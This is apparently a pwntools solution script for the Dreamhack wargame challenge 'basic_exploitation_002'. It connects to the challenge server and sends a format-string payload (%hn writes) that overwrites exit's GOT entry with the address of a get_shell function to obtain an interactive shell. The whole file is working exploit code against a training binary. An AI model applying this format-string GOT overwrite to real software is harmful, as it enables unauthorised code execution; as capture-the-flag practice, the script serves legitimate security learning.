from pwn import *
def slog(n, m): return success(": ".join([n, hex(m)]))

context.log_level = 'debug'

p = remote("host1.dreamhack.games", 12850)
# p = process("./basic_exploitation_002")
e = ELF("./basic_exploitation_002")
# gdb.attach(p)

get_shell = 0x08048609
exit_got = 0x804a024

slog("exit_got",exit_got)

payload = p32(exit_got+2)
payload += p32(exit_got)

#0x804 == 2052 - 8 => 2044
payload += b"%2044c%1$hn"

#0x8609 == 34313
payload += b"%32261c%2$hn"

p.send(payload)
p.recv()
p.interactive()